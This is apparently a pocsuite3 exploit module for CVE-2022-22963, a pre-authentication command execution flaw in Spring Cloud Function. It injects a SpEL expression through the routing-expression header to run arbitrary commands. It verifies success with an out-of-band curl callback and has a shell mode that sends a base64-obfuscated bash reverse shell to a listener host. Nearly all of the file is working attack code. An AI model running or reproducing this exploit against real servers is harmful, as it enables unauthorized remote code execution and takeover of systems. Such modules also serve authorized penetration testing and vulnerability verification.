#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)

minimum_version_required('1.9.11')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = 'lambo'
    vulDate = '2022-03-29'
    createDate = '2022-10-23'
    updateDate = '2022-10-23'
    references = [
        'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22963']
    name = 'spring spring function Pre-Auth Command Execution (CVE-2022-22963)'
    appPowerLink = ''
    appName = 'spring function'
    appVersion = '3.0.0 <= Spring Cloud Function <= 3.2.2'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('uname -a', description='The command to execute')
        return o

    def _exploit(self, param=''):
        if not self._check(dork=''):
            return False

        headers = {'spring.cloud.function.routing-expression':
                   f"T(java.lang.Runtime).getRuntime().exec(\"{param}\")"}
        logger.info(headers['spring.cloud.function.routing-expression'])
        payload = 'a=b'
        res = requests.post(self.url+"/functionRouter",
                            headers=headers, data=payload)
        logger.debug(res.text)
        return res.text

    def _verify(self):
        result = {}
        oob = CEye()
        v = oob.build_request(value='')
        url, flag = v['url'], v['flag']
        param = f'curl {url}'
        res = self._exploit(param)
        if oob.verify_request(flag):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _attack(self):
        # 自己构造rce的dnslog命令
        result = {}
        param = self.get_option('cmd')
        res = self._exploit(param)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _shell(self):
        cmd = REVERSE_PAYLOAD.BASH.format(
            get_listener_ip(), get_listener_port())
        cmd = str(base64.b64encode(cmd.encode()))
        cmd = cmd.strip('b').strip("'")

        cmd = 'bash -c {echo,' + cmd + '}|{base64,-d}|{bash,-i}'

        try:
            self._exploit(cmd)
        except Exception:
            pass


register_poc(DemoPOC)
